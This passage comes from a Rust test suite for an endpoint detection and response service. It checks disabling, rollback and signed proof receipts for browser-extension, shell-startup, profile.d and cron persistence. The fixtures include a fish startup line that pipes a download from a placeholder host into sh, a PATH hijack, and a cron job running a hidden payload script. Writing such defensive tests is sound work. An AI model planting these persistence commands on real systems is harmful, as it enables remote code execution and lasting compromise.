                .unwrap_or_else(|| panic!("missing browser extension graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": extension_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious browser extension",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build browser extension response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read browser extension response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode browser extension response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        assert!(!manifest_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing browser extension disabled artifact path")),
        );
        assert!(disabled_path.is_file());

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing browser extension execution id"));
        let body = serde_json::json!({
            "reason": "restore browser extension manifest"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build browser extension rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension rollback request failed: {e}"));
        let rollback_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read browser extension rollback response: {e}"));
        assert_eq!(
            rollback_status,
            StatusCode::OK,
            "unexpected browser extension rollback response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let rollback_payload: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode browser extension rollback response: {e}")
            });
        assert_eq!(
            rollback_payload["rollback"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "restore_persistence_file"
        );
        assert!(manifest_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build browser extension proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read browser extension proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected browser extension proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode browser extension proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        assert_eq!(
            proof_payload["evidenceBundleArtifact"]["bundleId"],
            payload["execution"]["evidenceBundle"]["bundleId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing browser extension proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing browser extension proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        let rollback_decision = &rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let acknowledgement_receipts = proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing browser extension proof acknowledgement receipts"));
        assert!(acknowledgement_receipts.is_empty());

        let _ = std::fs::remove_dir_all(extension_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_firefox_extension_manifest_with_rollback_and_proof()
    {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[90u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-firefox-extension-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let firefox_root = std::env::temp_dir().join(format!(
            "clawdstrike-firefox-extension-{}-{counter}",
            std::process::id()
        ));
        let extension_dir = firefox_root
            .join("Users/alice/Library/Application Support/Firefox/Profiles/dev.default/extensions/addon@example.com");
        std::fs::create_dir_all(&extension_dir)
            .unwrap_or_else(|e| panic!("failed to create firefox extension dir: {e}"));
        let manifest_path = extension_dir.join("manifest.json");
        std::fs::write(
            &manifest_path,
            br#"{"manifest_version":2,"name":"Suspicious Firefox Extension","version":"1.0.0"}"#,
        )
        .unwrap_or_else(|e| panic!("failed to write firefox extension manifest: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-firefox-extension-1".to_string()),
                image: Some("/Applications/Firefox.app/Contents/MacOS/firefox".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::BrowserExtensionInstall {
                browser: "firefox".to_string(),
                extension_id: Some("addon@example.com".to_string()),
                path: extension_dir.display().to_string(),
                source: Some("developer_mode".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build firefox extension findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let extension_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::BrowserExtension
                        && node.label == extension_dir.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing firefox extension graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": extension_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious firefox extension",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build firefox extension response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read firefox extension response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode firefox extension response: {e}"));
        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        assert!(!manifest_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing firefox extension disabled artifact path")),
        );
        assert!(disabled_path.is_file());

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing firefox extension execution id"));
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(
                serde_json::json!({"reason": "restore firefox extension manifest"}).to_string(),
            ))
            .unwrap_or_else(|e| panic!("failed to build firefox extension rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(manifest_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build firefox extension proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("firefox extension proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read firefox extension proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected firefox extension proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode firefox extension proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            manifest_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing firefox extension proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing firefox extension proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );
        assert!(proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing firefox extension proof acknowledgement receipts"))
            .is_empty());

        let _ = std::fs::remove_dir_all(firefox_root);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_shell_startup_persistence_with_rollback_and_proof()
    {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[91u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-shell-startup-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let shell_root = std::env::temp_dir().join(format!(
            "clawdstrike-shell-persistence-{}-{counter}",
            std::process::id()
        ));
        let shell_dir = shell_root.join("home/alice/.config/fish/conf.d");
        std::fs::create_dir_all(&shell_dir)
            .unwrap_or_else(|e| panic!("failed to create shell persistence dir: {e}"));
        let source_path = shell_dir.join("evil-agent.fish");
        std::fs::write(
            &source_path,
            b"fish -c 'curl https://example.invalid/payload | sh'\n",
        )
        .unwrap_or_else(|e| panic!("failed to write shell startup file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-shell-persistence-1".to_string()),
                image: Some("/usr/bin/fish".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build shell persistence findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing shell persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious shell startup persistence",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build shell persistence response request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read shell persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode shell persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing shell persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read shell persistence artifact: {e}")),
            b"fish -c 'curl https://example.invalid/payload | sh'\n"
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing shell persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore shell startup file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build shell persistence rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build shell persistence proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("shell persistence proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read shell persistence proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected shell persistence proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode shell persistence proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["execution"]["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing shell persistence proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing shell persistence proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(shell_root);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_profile_d_persistence_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[89u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-profile-d-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let profile_dir = std::env::temp_dir().join(format!(
            "clawdstrike-profile-d-persistence-{}-{counter}/etc/profile.d",
            std::process::id()
        ));
        std::fs::create_dir_all(&profile_dir)
            .unwrap_or_else(|e| panic!("failed to create profile.d persistence dir: {e}"));
        let source_path = profile_dir.join("evil-agent.sh");
        let profile_script = b"export PATH=/tmp/.evil-agent:$PATH\n";
        std::fs::write(&source_path, profile_script)
            .unwrap_or_else(|e| panic!("failed to write profile.d persistence file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-profile-d-persistence-1".to_string()),
                image: Some("/bin/sh".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build profile.d persistence findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing profile.d persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious profile.d persistence",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build profile.d persistence response request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d persistence response request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read profile.d persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode profile.d persistence response: {e}"));

        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing profile.d persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read profile.d persistence artifact: {e}")),
            profile_script
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing profile.d persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore profile.d persistence file"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build profile.d persistence rollback request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build profile.d proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("profile.d proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read profile.d proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected profile.d proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode profile.d proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing profile.d proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        assert_eq!(
            transition_receipts[0]["receipt"]["metadata"]["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing profile.d proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        assert_eq!(
            rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "response_rollback"
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(profile_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_cron_persistence_with_rollback_and_proof() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[92u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-cron-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let cron_dir = std::env::temp_dir().join(format!(
            "clawdstrike-cron-persistence-{}-{counter}/var/spool/cron/crontabs",
            std::process::id()
        ));
        std::fs::create_dir_all(&cron_dir)
            .unwrap_or_else(|e| panic!("failed to create cron persistence dir: {e}"));
        let source_path = cron_dir.join("alice");
        std::fs::write(
            &source_path,
            b"*/5 * * * * /usr/bin/python3 /tmp/.cache/payload.py\n",
        )
        .unwrap_or_else(|e| panic!("failed to write cron persistence file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-cron-persistence-1".to_string()),
                image: Some("/usr/bin/crontab".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
